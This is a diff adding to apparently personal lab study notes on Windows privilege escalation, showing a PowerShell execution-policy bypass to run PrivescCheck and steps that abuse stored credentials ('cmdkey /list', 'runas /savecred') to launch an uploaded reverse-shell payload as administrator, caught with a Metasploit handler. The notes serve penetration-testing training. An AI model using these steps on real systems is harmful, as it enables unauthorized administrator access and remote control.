@@ -62,3 +62,22 @@ Which function in PrivescCheck helps in identifying user privileges that could p
 
 C:> powershell.exe -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 C:> runas.exe /user:administrator cmd (Calling cmd with administrator privilege from PowerShell)
+___________________________________________________________________________________________________________________________________________________________________________________________
+Use cmdkey to get reverse shell (administrator)
+------------------------------------------------
+1. Get windows Student user with hta_server (meterpreter)
+2. meterpreter > shell
+C:> cmdkey /list
+
+ Target: Domain:interactive=ATTACKDEFENSE\administrator
+ Type: Domain Password
+ User: ATTACKDEFENSE\administrator
+
+There is no password but use that credential to get reverse shell
+
+3. upload shell.exe(reverse shell payload)
+4. C:> runas.exe /savecred /user:administrator shell.exe
+5. capture with msfconsole multi/handler
+
+Get Administrator access
+___________________________________________________________________________________________________________________________________________________________________________________________
